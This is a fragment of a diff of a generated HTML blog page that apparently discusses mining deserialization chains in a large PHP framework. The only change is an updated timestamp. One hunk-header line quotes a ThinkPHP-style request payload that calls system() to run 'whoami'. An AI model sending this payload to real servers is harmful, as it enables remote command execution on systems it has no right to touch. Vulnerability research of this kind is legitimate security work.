 </div><h3 id="小结-1"><a href="#小结-1" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:小结-1" class="headings">小结</a></h3>
 <p>在挖掘这种大型框架的反序列化链子的时候，代码量巨大，我们要在其中寻找：</p>
@@ -1061,7 +1061,7 @@ _method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami
 
         
     <div class="updated-badge-container">
-        <span title="Updated @ 2022-10-30 10:47:31 CST" style="cursor:help">
+        <span title="Updated @ 2022-10-30 10:47:32 CST" style="cursor:help">
 
 <svg xmlns="http://www.w3.org/2000/svg" width="130" height="20" class="updated-badge"><linearGradient id="b" x2="0" y2="100%"><stop offset="0" stop-color="#bbb" stop-opacity=".1"/><stop offset="1" stop-opacity=".1"/></linearGradient><clipPath id="a"><rect width="130" height="20" rx="3" fill="#fff"/></clipPath><g clip-path="url(#a)"><path class="updated-badge-left" d="M0 0h55v20H0z"/><path class="updated-badge-right" d="M55 0h75v20H55z"/><path fill="url(#b)" d="M0 0h130v20H0z"/></g><g fill="#fff" text-anchor="middle" font-size="110"><text x="285" y="150" fill="#010101" fill-opacity=".3" textLength="450" transform="scale(.1)">updated</text><text x="285" y="140" textLength="450" transform="scale(.1)">updated</text><text x="915" y="150" fill="#010101" fill-opacity=".3" textLength="650" transform="scale(.1)">2022-10-30</text><text x="915" y="140" textLength="650" transform="scale(.1)">2022-10-30</text></g></svg>
         </span></div>
